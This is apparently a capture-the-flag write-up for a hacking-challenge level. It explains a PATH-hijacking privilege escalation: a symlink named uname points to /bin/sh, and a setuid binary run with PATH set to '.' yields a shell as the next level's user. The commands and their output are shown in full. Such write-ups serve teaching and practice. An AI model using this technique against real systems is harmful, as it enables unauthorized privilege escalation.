In this level you had to exploit the fact, that if no absolute path is specified,
the system searches in the $PATH locations for it. Because the setuid binary
didn't use absoliute paths, it was possible to change the environment $PATH
variable. One of the first commands executed is `uname`. So we use a symlink
called uname to `/bin/sh`.

    ln -s /bin/sh uname

If we now set $PATH only to the current working directory "." the system will
search for the `uname` program and will only find the symlink. So it will execute
the shell for us.

    level05@hackme.knowit.no:/tmp/level05$ echo $PATH
    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games

    level05@hackme.knowit.no:/tmp/level05$ env PATH=. /levels/level05/level05

    [*] Get system information:
    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
    $ id
    uid=1009(level06) gid=1009(level06) groups=1009(level06)

Because the $PATH is now screwed, we have to reset it back to the original value,
otherwise no other commands will work.

This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
